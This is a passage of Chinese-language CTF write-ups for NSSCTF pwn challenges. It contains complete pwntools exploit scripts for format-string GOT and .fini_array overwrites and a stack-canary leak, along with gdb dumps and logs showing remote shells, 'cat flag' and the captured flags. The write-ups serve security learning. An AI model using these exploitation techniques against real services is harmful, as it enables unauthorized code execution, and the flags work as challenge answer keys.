0xffffce10:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffce20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffce30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffce40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffce50:     0x00000000      0x00000000
```

**分析**

- 定位到`backdoor_addr`在`printf`距离栈顶`11`位
- 用`%10$p`可查找验证

**编写最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 20762)
elf = ELF("./pwn")

backdoor_offset = 11
backdoor_addr = elf.sym["backdoor"]
printf_got_addr = elf.got["printf"]

payload = fmtstr_payload(backdoor_offset, {printf_got_addr: backdoor_addr})
r.sendline(payload)
r.sendline()

r.interactive()
r.close()
```

**分析**

- `fmtstr_payload(backdoor_offset, {printf_got_addr: backdoor_addr})`
- 将`printf`地址替换成`backdoor`地址
- 调用`printf`相当于调用了`backdoor`

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 20762
[x] Opening connection to node5.anna.nssctf.cn on port 20762: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 20762: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[*] Switching to interactive mode
gift: 0x9309008
       �                                                                                                                                                  �                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          aa���
ls
bin
dev
flag
lib
lib32
lib64
pwn
cat flag
NSSCTF{39cb4726-296f-4afd-a882-92f3d289f20f}
```

**得到：NSSCTF{39cb4726-296f-4afd-a882-92f3d289f20f}**



### [HZNUCTF 2023 preliminary]ffmt

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**分析**

- Linux64位小端序

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[8]; // [rsp+8h] [rbp-8h] BYREF

  init(argc, argv, envp);
  puts("Welcome to HCNUCTF!");
  puts("Your name: ");
  read(0, buf, 8uLL);
  printf(buf);
  puts(", hell0, please say something about yourself~");
  vuln();
  return 0;
}
```

```c
int vuln()
{
  char buf[32]; // [rsp+0h] [rbp-20h] BYREF

  read(0, buf, 0x20uLL);
  return printf(buf);
}
```

**分析**

- 这里存在`printf(buf)`和`return printf(buf)`两处格式化输出漏洞
- 但是第一次输入长度太小了，没什么用处
- 第二次长度是`32`可以用`fmtstr_payload`的`write_size = "long"`压缩长度，来构造payload
- 用`main`函数的`buf`，将`fini_array`的地址修改成`backdoor`的地址
- 注意这个是`64`位程序，而`fmtstr_payload`默认打包`32`位的`payload`，所以我们要事先声明`64`位

**数据搜集**

```assembly
.text:000000000040121B                 public backd00r
.text:000000000040121B backd00r        proc near
.text:000000000040121B ; __unwind {
.text:000000000040121B                 endbr64
.text:000000000040121F                 push    rbp
.text:0000000000401220                 mov     rbp, rsp
.text:0000000000401223                 lea     rdi, command    ; "/bin/sh"
.text:000000000040122A                 call    _system
.text:000000000040122F                 nop
.text:0000000000401230                 pop     rbp
.text:0000000000401231                 retn
.text:0000000000401231 ; } // starts at 40121B
.text:0000000000401231 backd00r        endp
```

```assembly
.text:0000000000401232                 public vuln
.text:0000000000401232 vuln            proc near               ; CODE XREF: main+66↓p
.text:0000000000401232
.text:0000000000401232 buf             = byte ptr -20h
.text:0000000000401232
.text:0000000000401232 ; __unwind {
.text:0000000000401232                 endbr64
.text:0000000000401236                 push    rbp
.text:0000000000401237                 mov     rbp, rsp
.text:000000000040123A                 sub     rsp, 20h
.text:000000000040123E                 lea     rax, [rbp+buf]
.text:0000000000401242                 mov     edx, 20h ; ' '  ; nbytes
.text:0000000000401247                 mov     rsi, rax        ; buf
.text:000000000040124A                 mov     edi, 0          ; fd
.text:000000000040124F                 call    _read
.text:0000000000401254                 lea     rax, [rbp+buf]
.text:0000000000401258                 mov     rdi, rax        ; format
.text:000000000040125B                 mov     eax, 0
.text:0000000000401260                 call    _printf
.text:0000000000401265                 nop
.text:0000000000401266                 leave
.text:0000000000401267                 retn
.text:0000000000401267 ; } // starts at 401232
.text:0000000000401267 vuln            endp
```

```shell
readelf -a pwn | grep ".fini_array"
```

```shell
  [21] .fini_array       FINI_ARRAY       0000000000403228  00002228
   05     .init_array .fini_array .dynamic .got .got.plt .data .bss 
    21: 0000000000403228     0 SECTION LOCAL  DEFAULT   21 .fini_array
```

```shell
gdb pwn
b *0x401260
r
deadbeef
stack 30
```

```shell
00:0000│ rdi rsi rsp 0x7fffffffdca0 —▸ 0x7fffffffdd0a ◂— 0xddf800007fffffff
01:0008│-018         0x7fffffffdca8 —▸ 0x7fffffffdce0 ◂— 1
02:0010│-010         0x7fffffffdcb0 ◂— 0
03:0018│-008         0x7fffffffdcb8 —▸ 0x7fffffffde08 —▸ 0x7fffffffe195 ◂— 'COLORFGBG=15;0'
04:0020│ rbp         0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 1
05:0028│+008         0x7fffffffdcc8 —▸ 0x4012d3 (main+107) ◂— mov eax, 0
06:0030│+010         0x7fffffffdcd0 ◂— 0
07:0038│+018         0x7fffffffdcd8 ◂— 0x6665656264616564 ('deadbeef')
08:0040│+020         0x7fffffffdce0 ◂— 1
09:0048│+028         0x7fffffffdce8 —▸ 0x7ffff7dd8ca8 (__libc_start_call_main+120) ◂— mov edi, eax
0a:0050│+030         0x7fffffffdcf0 —▸ 0x7fffffffdde0 —▸ 0x7fffffffdde8 ◂— 0x38 /* '8' */
0b:0058│+038         0x7fffffffdcf8 —▸ 0x401268 (main) ◂— endbr64 
0c:0060│+040         0x7fffffffdd00 ◂— 0x100400040 /* '@' */
0d:0068│+048         0x7fffffffdd08 —▸ 0x7fffffffddf8 —▸ 0x7fffffffe17a ◂— '/home/kali/Desktop/ctf/pwn'
0e:0070│+050         0x7fffffffdd10 —▸ 0x7fffffffddf8 —▸ 0x7fffffffe17a ◂— '/home/kali/Desktop/ctf/pwn'
0f:0078│+058         0x7fffffffdd18 ◂— 0x5a850bdac4780439
10:0080│+060         0x7fffffffdd20 ◂— 0
11:0088│+068         0x7fffffffdd28 —▸ 0x7fffffffde08 —▸ 0x7fffffffe195 ◂— 'COLORFGBG=15;0'
12:0090│+070         0x7fffffffdd30 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
13:0098│+078         0x7fffffffdd38 ◂— 0
14:00a0│+080         0x7fffffffdd40 ◂— 0xa57af4257d9a0439
15:00a8│+088         0x7fffffffdd48 ◂— 0xa57ae461dcba0439
16:00b0│+090         0x7fffffffdd50 ◂— 0
... ↓                3 skipped
1a:00d0│+0b0         0x7fffffffdd70 —▸ 0x7fffffffde08 —▸ 0x7fffffffe195 ◂— 'COLORFGBG=15;0'
1b:00d8│+0b8         0x7fffffffdd78 ◂— 0x38f55d6d1e73e700
1c:00e0│+0c0         0x7fffffffdd80 ◂— 0
1d:00e8│+0c8         0x7fffffffdd88 —▸ 0x7ffff7dd8d65 (__libc_start_main+133) ◂— mov r14, qword ptr [rip + 0x1bd21c]
```

```shell
fmtarg 0x7fffffffdca0
```

```shell
The index of format argument : 6 (\"\%5$p\")
```

**最终脚本**

```python
from pwn import *

context(arch = "amd64", os = "linux")

r = remote("node5.anna.nssctf.cn", 29807)

payload = "probie".encode()
r.sendlineafter("Your name: \n".encode(), payload)

main_buf_elf_offset = 6
fini_array_elf_addr = 0x403228
backdoor_elf_addr = 0x40121B

payload = fmtstr_payload(main_buf_elf_offset, {fini_array_elf_addr: backdoor_elf_addr}, write_size = "long")
r.sendlineafter("yourself~\n".encode(), payload)

r.interactive()
r.close()
```

```shell
                                                                               �a(2@ls
bin
dev
ffmt
flag
lib
lib32
lib64
libx32
cat flag
NSSCTF{b0d9af37-6f3d-4bde-939f-2361947ff55f}
```

**得到：NSSCTF{b0d9af37-6f3d-4bde-939f-2361947ff55f}**



### [HDCTF 2023]Makewish bugmaker

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

**分析**

- Linux64位小端序
- Canary

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-38h] BYREF
  int v5; // [rsp+Ch] [rbp-34h]
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v7; // [rsp+38h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v5 = rand() % 1000 + 324;
  puts("tell me you name\n");
  read(0, buf, 0x30uLL);
  puts("hello,");
  puts(buf);
  puts("tell me key\n");
  read(0, &v4, 4uLL);
  if ( v5 == v4 )
    return vuln();
  puts("failed");
  return 0;
}
```

```shell
int init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  return setvbuf(stderr, 0LL, 2, 0LL);
}
```

```c
__int64 vuln()
{
  _BYTE buf[88]; // [rsp+0h] [rbp-60h] BYREF
  unsigned __int64 v2; // [rsp+58h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("welcome to HDctf,You can make a wish to me");
  buf[(int)read(0, buf, 0x60uLL)] = 0;
  puts("sorry,i can't do that");
  return 0LL;
}
```

**分析**

- 它的`key`为`v5 = rand() % 1000 + 324`是一个伪随机数，在`init`中并没有初始化种子，所以`v5`会是定值，可以用`ida`动态调试得到`v5 == 0x2C3 == 707`
- `main`和`vuln`分别存在一个`read`
- 我们可以先用`main`中的`read`泄露出`canary`，然后用`vuln`中的`read`跳转到`backdoor`
- 之所以要泄露`canary`是因为我们要填满`vuln`中`buf`的`0x60 == 96`个字节让`buf[96] = rbp = 0`
- 可以理解为当`rbp`被修改成`0`后，它后门的返回地址就会在`buf`中乱跳，我们只要在`buf`中填满`backdoor`的地址就有机会让它的返回地址跳到`backdoor`，比如构造`payload = p64(backdoor) * 11 + p64(canary)`

**数据搜集**

```assembly
.text:00000000004007C7                 public treasure
.text:00000000004007C7 treasure        proc near
.text:00000000004007C7 ; __unwind {
.text:00000000004007C7                 push    rbp
.text:00000000004007C8                 mov     rbp, rsp
.text:00000000004007CB                 mov     edi, offset command ; "/bin/sh"
.text:00000000004007D0                 call    _system
.text:00000000004007D5                 nop
.text:00000000004007D6                 pop     rbp
.text:00000000004007D7                 retn
.text:00000000004007D7 ; } // starts at 4007C7
.text:00000000004007D7 treasure        endp
```

**分析**

- 这里我们取`.text:00000000004007CB                 mov     edi, offset command ; "/bin/sh"`为起点

**最终脚本**

```python
from pwn import *

# 连接
r = remote("node4.anna.nssctf.cn", 22064)

# 构造泄露 canary 的 payload
payload = cyclic(40)
payload += '|'.encode()
r.sendafter("tell me you name\n\n".encode(), payload)

# 获取 canary
r.recvuntil('|'.encode())
canary = u64('\x00'.encode() + r.recv(7))

# 绕过 v5 == v4
key = 0x2C3
payload = struct.pack("<i", key)
r.sendafter("tell me key\n\n".encode(), payload)

# 搜集到的 backdoor 地址
backdoor_elf_addr = 0x4007CB

# 构造发送跳转 backdoor 的 payload
payload = p64(backdoor_elf_addr) * 11
payload += p64(canary)
r.sendafter("welcome to HDctf,You can make a wish to me\n".encode(), payload)

# 交互
r.interactive()
r.close()
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 22064
[x] Opening connection to node4.anna.nssctf.cn on port 22064: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 22064: Done
[*] Switching to interactive mode
sorry,i can't do that
ls
bin
cs5
dev
flag
lib
lib32
lib64
cat flag
NSSCTF{5e0c6639-cabc-49dd-9bd3-e6b33ba61cb8}
```

**得到：NSSCTF{5e0c6639-cabc-49dd-9bd3-e6b33ba61cb8}**